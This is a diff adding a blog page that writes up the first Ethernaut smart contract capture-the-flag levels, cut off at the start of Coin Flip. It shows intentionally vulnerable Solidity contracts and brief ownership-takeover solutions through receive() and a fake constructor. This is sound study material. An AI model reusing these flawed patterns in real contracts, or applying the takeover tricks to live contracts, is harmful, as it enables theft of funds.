@@ -1,0 +1,1320 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.7750550c0319f5de56d916b91e642bf72a5bd09ee50b201dc2ed9db69d6177a8.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.ico>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">ce1evenn - Ethernaut</title>
+<meta property="og:title" content=ce1evenn&#32;-&#32;Ethernaut />
+<meta name="twitter:title" content=ce1evenn&#32;-&#32;Ethernaut />
+<meta itemprop="name" content=ce1evenn&#32;-&#32;Ethernaut />
+<meta name="application-name" content=ce1evenn&#32;-&#32;Ethernaut />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/posts/ethernaut/" />
+<link rel="canonical" href="/posts/ethernaut/" itemprop="url" />
+<meta name="url" content="/posts/ethernaut/" />
+<meta name="twitter:url" content="/posts/ethernaut/" />
+<meta property="og:url" content="/posts/ethernaut/" />
+
+
+<meta property="og:updated_time" content="2023-08-27T00:23:00&#43;08:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.148.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.1c6f56a6497e1d68469eb2a7efcf2b145601a94408f411014a7af5ffc3a73522.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5a5a5a;
+        --link-color: #268bd2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #bf616a;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #fff;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #eee;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9d9d9d;
+        --link-color: #268bd2;
+        --date-color: #9a9a9a;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #ff7f7f;
+        --code-background-color: #393D47;
+        --code-block-color: #fff;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="/">
+                <img src="/images/icon.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="/">
+                <h1>ce1evenn</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Footprint in Security
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/crypto-zombies/">Crypto Zombies</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/nas-docker-rss-subscription-service/">Nas Docker Rss Subscription Service</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/ethernaut/">Ethernaut</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/ce1evenn">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="/posts/ethernaut/">Ethernaut</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2023-08-27T00:23:00&#43;0800" class="post-date">
+        August 27, 2023
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>11 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-blockchain">
+        <a href="/tags/blockchain">blockchain</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="study-material">Study Material</h2>
+<ul>
+<li><a href="https://www.quicknode.com/guides/welcome" target="_blank">QuickNode</a></li>
+<li><a href="https://docs.soliditylang.org/en/develop/index.html" target="_blank">soliditylang</a></li>
+</ul>
+<blockquote>
+<p>Ethernaut, a CTF-like smart contract security challenge writeup</p></blockquote>
+<h2 id="1-ethernaut0---hello-ethernaut">1. Ethernaut0 - Hello Ethernaut</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Instance</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">string</span> <span style="color:#66d9ef">public</span> password;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8</span> <span style="color:#66d9ef">public</span> infoNum <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">string</span> <span style="color:#66d9ef">public</span> theMethodName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;The method name is method7123949.&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">private</span> cleared <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// constructor
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> _password) {
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> _password;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">info</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;You will find what you need in info1().&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">info1</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Try info2(), but with &#34;hello&#34; as a parameter.&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">info2</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> param) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(keccak256(abi.encodePacked(param)) <span style="color:#f92672">==</span> keccak256(abi.encodePacked(<span style="color:#e6db74">&#39;hello&#39;</span>))) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;The property infoNum holds the number of the next info method to call.&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Wrong parameter.&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">info42</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;theMethodName is the name of the next method.&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">method7123949</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;If you know the password, submit it to authenticate().&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">authenticate</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> passkey) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(keccak256(abi.encodePacked(passkey)) <span style="color:#f92672">==</span> keccak256(abi.encodePacked(password))) {
+</span></span><span style="display:flex;"><span>      cleared <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getCleared</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cleared;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><h3 id="11-solution">1.1 Solution</h3>
+<p>Starting from <strong>contract.info()</strong> which redirecting me to a function that change &ldquo;cleared&rdquo; to true;</p>
+<h3 id="12-remark">1.2 Remark</h3>
+<p>Know the basic of smart contract
+function calling</p>
+<ul>
+<li>player (get the player address)</li>
+<li>getBalance(player) / await getBalancer(player) *if reads &ldquo;pending&rdquo;</li>
+<li>ethernaut (get the contract)</li>
+<li>ethernaut.owenr()</li>
+<li>contract.info() &lt;- Ethernaut0&rsquo;s starting point</li>
+</ul>
+<h2 id="2-ethernaut1---fallback">2. Ethernaut1 - Fallback</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallback</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> contributions;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    contributions[msg.sender] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>        require(
+</span></span><span style="display:flex;"><span>            msg.sender <span style="color:#f92672">==</span> owner,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+</span></span><span style="display:flex;"><span>    contributions[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(contributions[msg.sender] <span style="color:#f92672">&gt;</span> contributions[owner]) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getContribution</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> contributions[msg.sender];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">payable</span>(owner).transfer(<span style="color:#66d9ef">address</span>(this).balance);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> contributions[msg.sender] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="21-solution">2.1 Solution</h3>
+<p>Leverage contribute() &amp; receive()</p>
+<ol>
+<li>Contribute &gt; 1000ether will become the contract owner (as a CTF-like challenge, surely it&rsquo;s not the way)</li>
+<li>Contribute() few ether</li>
+<li>Use low level interaction to trigger receive(), as contribute few ether to the contract which the require() will be fullfilled. Then, becomes the contract owner with &lt;1000 ether contribution</li>
+</ol>
+<h3 id="22-remark">2.2 Remark</h3>
+<p>Remix&rsquo;s low level interactions can trigger <strong>receive</strong></p>
+<ul>
+<li>how to call fallback?</li>
+<li>Remix&rsquo;s low level interactions is using transfer/send?</li>
+</ul>
+<h2 id="3-ethernaut2---fallout">3. Ethernaut2 - Fallout</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallout</span> {
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) allocations;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* constructor */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    allocations[owner] <span style="color:#f92672">=</span> msg.value;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>	        require(
+</span></span><span style="display:flex;"><span>	            msg.sender <span style="color:#f92672">==</span> owner,
+</span></span><span style="display:flex;"><span>	            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+</span></span><span style="display:flex;"><span>	        );
+</span></span><span style="display:flex;"><span>	        <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>	    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocate</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    allocations[msg.sender] <span style="color:#f92672">=</span> allocations[msg.sender].add(msg.value);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendAllocation</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> allocator) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    require(allocations[allocator] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    allocator.transfer(allocations[allocator]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">collectAllocations</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>    msg.sender.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocatorBalance</span>(<span style="color:#66d9ef">address</span> allocator) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> allocations[allocator];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="31-solution">3.1 Solution</h3>
+<p>Call Fal1out() function directly by removing other unecessary funciton, then deploy on remix at the instance address. *Fal1out() is a fake constructor, constructor in solidty should be <a href="#32-remark">constructor</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallout</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) allocations;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* constructor */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    allocations[owner] <span style="color:#f92672">=</span> msg.value;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="32-remark">3.2 Remark</h3>
+<p><strong>constructor</strong> is an optional function that execute contract creation. Should be implement in the way as below</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">20</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Base contract X
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">X</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">string</span> <span style="color:#66d9ef">public</span> name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">string</span> <span style="color:#66d9ef">memory</span> _name) {
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> _name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="4-ethernaut4---coin-flip">4. Ethernaut4 - Coin Flip</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
